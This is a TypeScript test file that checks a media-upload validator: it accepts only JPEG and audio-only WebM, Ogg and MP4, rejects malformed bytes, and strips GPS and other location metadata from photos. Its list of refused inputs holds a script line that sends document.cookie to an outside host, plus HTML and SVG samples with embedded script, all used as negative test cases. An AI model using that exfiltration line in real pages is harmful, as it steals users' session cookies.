// Ticket 3.18: the media checks on the bytes themselves (criteria 3 and 4). Real encoder output (Chromium's JPEG and
// MediaRecorder's WebM) and the decoding of a stripped photo are proved in browser.test.ts.
import { describe, expect, it } from "vitest";
import { exifWithGps, jpegOfSize, mp4OfSize, oggOfSize, PNG_SIGNATURE, segment, webmOfSize, xmpWithGps } from "./fixtures.js";
import { detectMedia, MEDIA_CONTENT_TYPES, stripJpegMetadata } from "./formats.js";

const KB = 1024;

/** Every JPEG marker in a JPEG's header part (before the first scan's data). */
function markers(jpeg: Buffer): number[] {
  const found: number[] = [];
  let pos = 2;
  while (pos < jpeg.length) {
    const marker = jpeg[pos + 1] as number;
    found.push(marker);
    if (marker === 0xda || marker === 0xd9) break;
    pos += 2 + jpeg.readUInt16BE(pos + 2);
  }
  return found;
}

describe("accepted formats, by their bytes", () => {
  it("accepts a JPEG, a WebM/Opus, an Ogg/Opus and an MP4 with AAC or Opus audio, each with its fixed content type", () => {
    expect(detectMedia(jpegOfSize(10 * KB))).toBe("jpeg");
    expect(detectMedia(webmOfSize(10 * KB))).toBe("webm");
    expect(detectMedia(oggOfSize(10 * KB))).toBe("ogg");
    expect(detectMedia(mp4OfSize(10 * KB))).toBe("mp4");
    expect(detectMedia(mp4OfSize(10 * KB, [["soun", "Opus"]]))).toBe("mp4");
    expect(MEDIA_CONTENT_TYPES).toEqual({ jpeg: "image/jpeg", webm: "audio/webm", ogg: "audio/ogg", mp4: "audio/mp4" });
  });

  it("criterion 3: refuses a PNG, an HTML page, a script, SVG, a PDF, a GIF, empty bytes and a video (WebM VP8/VP9, MP4 H.264, Ogg Theora)", () => {
    const refused: [string, Buffer][] = [
      ["png", Buffer.concat([PNG_SIGNATURE, Buffer.alloc(100)])],
      ["html", Buffer.from("<!doctype html><html><script>alert(1)</script></html>")],
      ["script", Buffer.from("fetch('https://example.com/?' + document.cookie)")],
      ["svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')],
      ["pdf", Buffer.from("%PDF-1.7\n")],
      ["gif", Buffer.from("GIF89a\x01\x00\x01\x00")],
      ["empty", Buffer.alloc(0)],
      ["webm vp8 video", webmOfSize(10 * KB, ["V_VP8"])],
      ["webm video and audio", webmOfSize(10 * KB, ["A_OPUS", "V_VP9"])],
      ["webm vorbis", webmOfSize(10 * KB, ["A_VORBIS"])],
      ["matroska", webmOfSize(10 * KB, ["A_OPUS"], "matroska")],
      ["mp4 video", mp4OfSize(10 * KB, [["vide", "avc1"]])],
      ["mp4 video and audio", mp4OfSize(10 * KB, [["soun", "mp4a"], ["vide", "avc1"]])],
      ["mp4 sound of another codec", mp4OfSize(10 * KB, [["soun", "ac-3"]])],
      ["ogg theora", oggOfSize(10 * KB, Buffer.from("\x80theora\x03\x02\x01", "latin1"))],
    ];
    for (const [name, bytes] of refused) expect(detectMedia(bytes), name).toBeUndefined();
  });

  it("refuses a declared format whose structure breaks: a cut JPEG, a JPEG without EOI or scan, a cut WebM, a cut MP4", () => {
    const jpeg = jpegOfSize(5 * KB);
    expect(detectMedia(jpeg.subarray(0, 1000))).toBeUndefined();
    expect(detectMedia(jpeg.subarray(0, jpeg.length - 2))).toBeUndefined();
    expect(detectMedia(Buffer.from([0xff, 0xd8, 0xff, 0xd9]))).toBeUndefined();
    expect(detectMedia(webmOfSize(5 * KB).subarray(0, 40))).toBeUndefined();
    expect(detectMedia(mp4OfSize(5 * KB).subarray(0, 100))).toBeUndefined();
    // HTML behind a JPEG's first bytes is not a JPEG.
    expect(detectMedia(Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.from("<html><script>alert(1)</script>")]))).toBeUndefined();
  });

  it("ends on any bytes: random and adversarial inputs never throw or loop", () => {
    let x = 1;
    const random = (n: number) => Buffer.from(Array.from({ length: n }, () => ((x = (x * 1103515245 + 12345) >>> 0) >>> 16) & 0xff));
    for (const start of [Buffer.from([0xff, 0xd8, 0xff]), Buffer.from([0x1a, 0x45, 0xdf, 0xa3]), Buffer.from("OggS"), Buffer.from("\0\0\0\x08ftyp", "latin1")]) {
      for (let i = 0; i < 300; i += 1) expect(() => detectMedia(Buffer.concat([start, random(i * 7)]))).not.toThrow();
    }
    // Zero-sized and huge-sized boxes and elements.
    expect(detectMedia(Buffer.concat([Buffer.from("\0\0\0\x00ftyp", "latin1"), Buffer.alloc(8)]))).toBeUndefined();
    expect(detectMedia(Buffer.concat([Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff])]))).toBeUndefined();
  });
});

describe("criterion 4: a photo loses its location data", () => {
  it("removes the Exif segment with its GPS IFD, XMP, IPTC, comments, other APPn and an MPF index, and keeps JFIF, the ICC profile and Adobe's segment", () => {
    const icc = segment(0xe2, Buffer.from("ICC_PROFILE\0\x01\x01colour data", "latin1"));
    const mpf = segment(0xe2, Buffer.from("MPF\0index of the extra pictures", "latin1"));
    const adobe = segment(0xee, Buffer.from("Adobe\0\x64\0\0\0\0\x01", "latin1"));
    const iptc = segment(0xed, Buffer.from("Photoshop 3.0\0city=Paris", "latin1"));
    const comment = segment(0xfe, Buffer.from("taken at 12 rue de la Paix"));
    const maker = segment(0xe9, Buffer.from("maker notes with a place"));
    const photo = jpegOfSize(20 * KB, [exifWithGps(), xmpWithGps(), icc, mpf, adobe, iptc, comment, maker]);
    expect(photo.includes(Buffer.from("Exif\0\0"))).toBe(true);

    const stripped = stripJpegMetadata(photo);
    expect(stripped).toBeDefined();
    const kept = stripped as Buffer;
    for (const gone of ["Exif", "GPS", "xap/1.0", "GPSLatitude", "Photoshop", "Paris", "rue de la Paix", "maker notes", "MPF\0"]) expect(kept.includes(Buffer.from(gone)), gone).toBe(false);
    expect(markers(kept)).toEqual([0xe0, 0xe2, 0xee, 0xdb, 0xc0, 0xc4, 0xda]);
    expect(kept.includes(Buffer.from("ICC_PROFILE\0"))).toBe(true);
    expect(kept.includes(Buffer.from("Adobe"))).toBe(true);
    // The picture's own segments and data are unchanged: the result is the photo without the removed segments.
    const removed = [exifWithGps(), xmpWithGps(), mpf, iptc, comment, maker].reduce((n, s) => n + s.length, 0);
    expect(kept.length).toBe(photo.length - removed);
    expect(kept.subarray(-2)).toEqual(Buffer.from([0xff, 0xd9]));
    expect(detectMedia(kept)).toBe("jpeg");
  });

  it("drops anything after the picture's end (a phone's extra pictures, which carry their own Exif), and leaves a JPEG without metadata byte for byte", () => {
    const plain = jpegOfSize(8 * KB);
    expect(stripJpegMetadata(plain)?.equals(plain)).toBe(true);
    const withTrailer = Buffer.concat([plain, jpegOfSize(2 * KB, [exifWithGps()])]);
    expect(stripJpegMetadata(withTrailer)?.equals(plain)).toBe(true);
  });

  it("keeps stuffed bytes, restart markers and a progressive JPEG's later tables and scans", () => {
    const head = jpegOfSize(100).subarray(0, -2 - 0);
    const sosEnd = head.lastIndexOf(Buffer.from([0xff, 0xda])) + 2 + 8;
    const scan1 = Buffer.from([0x12, 0xff, 0x00, 0x34, 0xff, 0xd0, 0x56]);
    const dht = segment(0xc4, Buffer.concat([Buffer.from([0x10]), Buffer.alloc(16)]));
    const sos2 = segment(0xda, Buffer.from([1, 1, 0, 1, 5, 0]));
    const jpeg = Buffer.concat([head.subarray(0, sosEnd), scan1, dht, sos2, Buffer.from([0x78, 0x9a]), Buffer.from([0xff, 0xff, 0xd9])]);
    const stripped = stripJpegMetadata(jpeg);
    expect(stripped?.includes(scan1)).toBe(true);
    expect(stripped?.includes(dht)).toBe(true);
    expect(stripped?.includes(sos2)).toBe(true);
    expect(stripped?.subarray(-2)).toEqual(Buffer.from([0xff, 0xd9]));
  });
});
